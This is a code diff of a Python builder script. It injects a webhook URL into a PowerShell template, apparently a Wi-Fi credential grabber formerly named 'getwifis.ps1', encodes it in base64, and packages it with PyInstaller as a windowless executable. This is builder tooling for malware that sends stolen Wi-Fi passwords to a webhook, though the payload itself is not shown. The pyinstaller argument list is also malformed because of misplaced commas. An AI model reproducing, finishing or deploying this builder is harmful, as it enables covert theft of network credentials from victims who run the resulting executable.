@@ -1,12 +1,18 @@
 import re
 import sys
 from base64 import b64encode
+import subprocess
 
-def main():
+def compile():
+    cmd = ['pyinstaller,' '--onefile,' '--noconsole', '--icon=icon.ico', 'script.py']
+    subprocess.run(cmd,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+def build():
 
     hookurl = sys.argv[1]
-
-    with open('getwifis.ps1', 'r+') as file:
+    
+    with open('template.ps1', 'r+') as file:
         content = file.read()
         new_content = re.sub('WEBHOOK_URL_HERE', hookurl, content)
         b64ps = b64encode(new_content.encode('utf16')[2:]).decode()
@@ -18,6 +24,10 @@ def main():
         file.seek(0)
         file.write(new_content)
         file.truncate()
+
+def main():
+    build()
+    compile()
 
 if __name__ == "__main__":
     main()
